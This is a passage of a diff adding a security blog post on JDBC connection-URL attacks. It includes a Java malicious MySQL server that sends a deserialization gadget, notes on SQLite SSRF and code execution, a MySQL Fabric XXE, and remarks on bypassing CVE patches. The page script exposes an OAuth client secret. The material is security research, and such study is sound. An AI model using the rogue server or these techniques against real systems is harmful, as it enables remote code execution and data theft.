+<pre><code class="language-java">public class EvilSlaveServer {
+    public static void main(String[] args) throws Exception {
+        int port = 4851;
+        ServerSocket server = new ServerSocket(port);
+        Socket socket = server.accept();
+        socket.getOutputStream().write(Serializer.serialize(new CommonsBeanutils1().getObject(&quot;open -a Calculator&quot;)));
+        socket.getOutputStream().flush();
+        Thread.sleep(TimeUnit.SECONDS.toMillis(5));
+        socket.close();
+        server.close();
+    }
+}
+</code></pre>
+<h2 id="sqlite">SQLite</h2>
+<p>Method <code>org.sqlite.core.CoreConnection#open</code> is called when opening a connection to the database using an SQLite library.</p>
+<p>This method provides a feature: if the connection URL starts with <code>:resource:</code>, the <code>extractResource</code> method will be called to obtain the database content from an URL connection.</p>
+<figure data-type="image" tabindex="39"><img src="https://su18.org/post-images/1631003008206.png" alt="" loading="lazy"></figure>
+<p><code>extractResource()</code>:</p>
+<figure data-type="image" tabindex="40"><img src="https://su18.org/post-images/1631003457311.png" alt="" loading="lazy"></figure>
+<p>That means if we prepare a connection like <code>jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db</code>, SQLite will connect the address and get content from it.That indeed cause a SSRF, but SSRF is not enough.</p>
+<p>So if we can control the JDBC URL and the database file content, how do we exploit it?</p>
+<p>Refer to &quot;<a href="https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/">SELECT code_execution FROM * USING SQLite;</a>&quot;, we could utilize &quot;CREATE VIEW&quot; to convert uncontrollable SELECT statement to controllable.</p>
+<p>If we could controll the SELECT statement,we could use <code>SELECT load_extension('/tmp/test.so')</code> to load the dll/so and exec evil code, but in real world it's not easy to have controllable files on the target system and load_extension is set to off by default.</p>
+<p>Other than common vulnerabilities, we could use memory corruptions in SQLite such &quot;Magellan&quot; to cause JVM crash.</p>
+<figure data-type="image" tabindex="41"><img src="https://su18.org/post-images/1631004798737.png" alt="" loading="lazy"></figure>
+<h1 id="how-to-defend">How To Defend</h1>
+<p>Above is almost all about the common use in JDBC Connection URL Attack reasearched and summarized by Litch1.</p>
+<p>This part talks about how open source software defend against JDBC attacks.</p>
+<p><strong>Apache Druid CVE-2021-26919 Patch</strong></p>
+<figure data-type="image" tabindex="42"><img src="https://su18.org/post-images/1631070799291.png" alt="" loading="lazy"></figure>
+<p><strong>Apache DolphinScheduler CVE-2020-11974 Patch</strong></p>
+<figure data-type="image" tabindex="43"><img src="https://su18.org/post-images/1631070829350.png" alt="" loading="lazy"></figure>
+<p>We could take advanges of differences between Properties Filter Parser and JDBC Driver Parser and use it to bypass the security patch.</p>
+<h1 id="java-service-provider-interface">Java Service Provider Interface</h1>
+<p>SPI technology is used in loading the driver of JDBC Connector.</p>
+<figure data-type="image" tabindex="44"><img src="https://su18.org/post-images/1631091471854.png" alt="" loading="lazy"></figure>
+<p>In version 5.1.48 of mysql connector, there are two driver registered.Other than the common driver <code>com.mysql.cj.jdbc.Driver</code>, these is this driver named <code>com.mysql.fabric.jdbc.FabricMySQLDriver</code>.</p>
+<p>MySQL Fabric is a system for managing a farm of MySQL servers.MySQL Fabric provides an extensible and easy to use system for managing a MySQL deployment for sharding and high-availability.</p>
+<p>Litch1 studied the source code of FabricMySQLDriver and find if connection url start with <code>jdbc:mysql:fabric://</code>, program will go in Fabric process logic.</p>
+<figure data-type="image" tabindex="45"><img src="https://su18.org/post-images/1631153937968.png" alt="" loading="lazy"></figure>
+<p>And will send a XMLRPC request to the host.</p>
+<figure data-type="image" tabindex="46"><img src="https://su18.org/post-images/1631154094720.png" alt="" loading="lazy"></figure>
+<p>Which means Fabric will call XMLRPC request automatically after JDBC Connection.It's seems like SSRF.</p>
+<p>But as always, SSRF is not enough.Litch1 dig and find XXE vulnerability in processing response data.</p>
+<figure data-type="image" tabindex="47"><img src="https://su18.org/post-images/1631154734217.png" alt="" loading="lazy"></figure>
+<p>So,make a connection, parse a XML, and the evil server like this.</p>
+<figure data-type="image" tabindex="48"><img src="https://su18.org/post-images/1631154417536.png" alt="" loading="lazy"></figure>
+<h1 id="summary">Summary</h1>
+<p><a href="https://github.com/su18/JDBC-Attack">https://github.com/su18/JDBC-Attack</a></p>
+<h1 id="reference">Reference</h1>
+<p><a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf</a></p>
+<p><a href="https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf">https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf</a></p>
+<p><a href="https://paper.seebug.org/1227/">https://paper.seebug.org/1227/</a></p>
+<p><a href="https://www.cnblogs.com/Welk1n/p/12056097.html">https://www.cnblogs.com/Welk1n/p/12056097.html</a></p>
+<p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
+<p><a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a></p>
+<p><a href="https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload">https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload</a></p>
+<p><a href="https://github.com/alibaba/cobar">https://github.com/alibaba/cobar</a></p>
+<p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p>
+<p><a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-interceptors.html">https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-interceptors.html</a></p>
+<p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a></p>
+<p><a href="https://www.slideshare.net/qqlan/database-honeypot-by-design-25195927">https://www.slideshare.net/qqlan/database-honeypot-by-design-25195927</a></p>
+<p><a href="https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html">https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html</a></p>
+<p><a href="https://lorexxar.cn/2020/01/14/css-mysql-chain/">https://lorexxar.cn/2020/01/14/css-mysql-chain/</a></p>
+<p><a href="https://xz.aliyun.com/t/3973">https://xz.aliyun.com/t/3973</a></p>
+<p><a href="http://www.h2database.com/html/features.html#connection_modes">http://www.h2database.com/html/features.html#connection_modes</a></p>
+<p><a href="https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/">https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#beginning">Beginning</a>
+<ul>
+<li><a href="#introduction-to-java-deserialization">Introduction to Java Deserialization</a></li>
+<li><a href="#well-known-defense-solutions">Well-Known Defense Solutions</a></li>
+<li><a href="#critical-vulnerabilities-in-java">Critical vulnerabilities in Java</a>
+<ul>
+<li><a href="#urlconnection">URLConnection</a></li>
+<li><a href="#jdbc">JDBC</a></li>
+</ul>
+</li>
+<li><a href="#new-exploit-for-java-deserialization">New exploit for Java Deserialization</a></li>
+<li><a href="#takeaways">Takeaways</a></li>
+</ul>
+</li>
+<li><a href="#afterwards">Afterwards</a></li>
+<li><a href="#build-my-own-fake-server">Build My Own Fake Server</a>
+<ul>
+<li><a href="#prepare-the-serialized-class-byte-code">Prepare the serialized class byte code</a></li>
+<li><a href="#config-the-proxy-mysql-server">Config the Proxy Mysql Server</a></li>
+<li><a href="#make-connection">Make Connection</a></li>
+</ul>
+</li>
+<li><a href="#cheat-sheet">Cheat Sheet</a>
+<ul>
+<li><a href="#serverstatusdiffinterceptor">ServerStatusDiffInterceptor</a></li>
+<li><a href="#detectcustomcollations">detectCustomCollations</a></li>
+</ul>
+</li>
+<li><a href="#arbitrary-file-reading-vulnerability">Arbitrary File Reading Vulnerability</a></li>
+<li><a href="#make-jdbc-attacks-brilliant-again">Make JDBC Attacks Brilliant Again</a>
+<ul>
+<li><a href="#csrf-to-jdbc-attackweblogic">CSRF to JDBC Attack(Weblogic)</a></li>
+<li><a href="#reconfigure-jdbc-resourcewildfy">Reconfigure JDBC Resource(Wildfy)</a></li>
+<li><a href="#h2-rce">H2 RCE</a>
+<ul>
+<li><a href="#init-runscript">INIT RUNSCRIPT</a></li>
+<li><a href="#source-code-compiler">Source Code Compiler</a></li>
+</ul>
+</li>
+<li><a href="#ibm-db2">IBM DB2</a></li>
+<li><a href="#modeshape">ModeShape</a></li>
+<li><a href="#apache-derby">Apache Derby</a></li>
+<li><a href="#sqlite">SQLite</a></li>
+</ul>
+</li>
+<li><a href="#how-to-defend">How To Defend</a></li>
+<li><a href="#java-service-provider-interface">Java Service Provider Interface</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#reference">Reference</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://su18.org/post/ysuserial/">
+              <h3 class="post-title">
+                Java 反序列化取经路
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
